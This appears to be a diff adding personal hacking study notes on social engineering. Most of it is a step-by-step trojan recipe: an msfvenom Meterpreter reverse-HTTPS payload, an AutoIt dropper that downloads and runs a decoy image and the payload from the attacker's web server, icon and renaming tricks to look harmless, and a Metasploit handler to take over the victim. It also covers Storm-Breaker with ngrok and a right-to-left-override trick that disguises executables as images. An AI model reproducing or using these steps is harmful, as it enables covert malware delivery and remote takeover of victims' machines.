@@ -1,0 +1,126 @@
+SOCIAL ENGINEERING
+
+Tools:
+ - Storm-Breaker (more about it ON OFFICIAL WEBSITE "https://ngrok.com/")
+
+
+sometimes to use or install the software we have to make virtual environment:
+commands:
+
+python3 -m venv .venv --- creates the Virutal Enviroment
+source .venv/bin/activate --- we activate it
+deactivate --- deactivating it!
+
+HOW TO START Storm-Braker
+in the file directory we use the command:
+sudo python3 st.py (there shoud be st.py) in the directory!
+
+AFTER STARTING IT WE NEED "NGROK" (more about it ON OFFICIAL WEBSITE "https://ngrok.com/")
+
+THERE ARE INSTRUCTIONS THAT TELLS US TO USE ONE COMMAND IN OTHER TERMINAL IN ORDER TO USE THE Storm-Baker
+command:
+./ngrok http 2525 --- (run our webserver)
+
+in ngrok we will see link and after opening it we will see login page 
+CREDENTIALS FOR THIS:
+admin
+admin
+
+Tools: (Gathering information)
+ - maltego (more about it ON OFFICIAL WEBSITE "https://www.maltego.com/")
+
+ - sherlock (more about it ON OFFICIAL WEBSITE "https://github.com/sherlock-project/sherlock")
+		example ussage: sherlock <username>
+
+
+CREATING BACKDOOR USING IMMAGE!
+
+1.) Download immage file and conevrt it to icon (there is online converter)
+2.) Create payload:
+	msfvenom --payload windows/meterpreter/reverse_https LHOST=10.0.2.4 LPORT=4545 --	format exe --out myhttps.exe (LHOST depend)
+3.) After creating them coppy the PNG; ICON; EXE files in var/www/html/Backdoor (WEB SERVER SHOUD BE STARTED)
+4.) Download "autoit" software on WINDOWS machine (it works only on windows) and the go to link "https://github.com/atilsamancioglu/TrojanFactory/blob/master/autoit-download-and-execute.txt" and coppy the scripts and paste it to the TXT file:
+	SCRIPTS:
+	
+	#include <StaticConstants.au3>
+#include <WindowsConstants.au3>
+
+Local $urls = "url1,url2"
+
+Local $urlsArray = StringSplit($urls, ",", 2 )
+
+For $url In $urlsArray
+	$sFile = _DownloadFile($url)
+	shellExecute($sFile)
+
+Next
+
+Func _DownloadFile($sURL)
+    Local $hDownload, $sFile
+    $sFile = StringRegExpReplace($sURL, "^.*/", "")
+    $sDirectory = @TempDir & $sFile
+    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
+    InetClose($hDownload)
+    Return $sDirectory
+EndFunc   ;==>_GetURLImage
+
+5.) Go to kali linux webserver from your windows and from there download the icon file that we copied in step "3.)"
+6.) in the code above we need to specify 2 url's
+	the lines shoud look like this after changing it:
+Local $urls = "http://172.16.18.34/Backdoor/android_mobil_uygulama.png,http://172.16.18.34/Backdoor/myhttps.exe
+	THE FINAL READY SCRIPT SHOUD LOOCK LIKE THIS:
+
+	SCRIPT:
+	#include <StaticConstants.au3>
+#include <WindowsConstants.au3>
+
+Local $urls = "http://172.16.18.34/Backdoor/android_mobil_uygulama.png,http://172.16.18.34/Backdoor/myhttps.exe"
+
+Local $urlsArray = StringSplit($urls, ",", 2 )
+
+For $url In $urlsArray
+	$sFile = _DownloadFile($url)
+	shellExecute($sFile)
+
+Next
+
+Func _DownloadFile($sURL)
+    Local $hDownload, $sFile
+    $sFile = StringRegExpReplace($sURL, "^.*/", "")
+    $sDirectory = @TempDir & $sFile
+    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
+    InetClose($hDownload)
+    Return $sDirectory
+EndFunc   ;==>_GetURLImage
+
+NOTE:
+THE FIRST URL IS POINTED TO YOUR LOCAL SERVER ADDRESS AND YOUR "PNG" OR "JPG" FILE!
+THE SECCOND URL IS POINTED TO YOUR LOCAL SERVER ADDRESS AND YOUR "EXE" FILE!
+
+
+7.) IN WINDOWS SEARCH IN TASK BAR "COMPILE SCRIPT" AND RUN IT!
+8.) In source  choose "txt" file we created including the code above inside: 
+9.) In destination choose .exe 
+10.) In options add the icon we have downlaoded and click  convert 
+11.) It will pop up in the directory where the above files are located (YOU CAN RENAME THE "EXE" FILE IF YOU WANT TO BE MORE UNSUSPICIOUS)
+12.) IN KALI LINUX RUN THE COMMANDS
+	msfconsole
+	use exploit/multi/handler
+	set payload windows/meterpreter/reverse_https
+	show options 
+	set LHOST 172.16.18.34
+	set LPORT 4545
+	exploit -j -z
+13.) Open the .exe file we created in steps (7-11)
+14.) In kali Linux type:
+	sessions -l
+	sessions -1 (1 is the id of the current session with the infected target)
+WE ARE DONE!
+
+
+
+FILE EXTENTIONS CHANGING
+1.) Go to this website "https://unicode-explorer.com/c/202E" and click on tha big button "copy"
+2.) NOW THIS IS AN EXAMPLE:
+	when we click coppy we have to go to the file we want to change the extention of and we can do that in that way
+	- if the file is colled "Android.exe"; We click rename and we name it "Androjpg.exe"; Then we mark 	"jpg.exe" and click paste; Then if it doesn't work we don't save the file we just type on hand so it would 	loock like 	this at the end and not gives us error after saving: "Androexe.jpg" 
